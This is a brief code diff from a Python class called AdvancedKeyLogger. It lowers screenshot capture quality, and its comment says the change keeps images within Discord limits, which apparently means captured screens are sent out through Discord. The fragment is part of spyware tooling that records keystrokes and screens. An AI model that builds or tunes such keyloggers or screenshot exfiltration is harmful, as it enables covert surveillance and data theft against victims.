@@ -147,7 +147,7 @@ class AdvancedKeyLogger:
                 self.screenshot_capture = ScreenshotCapture(
                     callback=self._on_screenshot_taken,
                     interval=SCREENSHOT_INTERVAL,
-                    quality=85,  # Higher quality (1-100)
+                    quality=70,  # Good quality without exceeding Discord limits
                     max_size=(1920, 1080)  # Full HD resolution
                 )
                 if self.screenshot_capture.start():
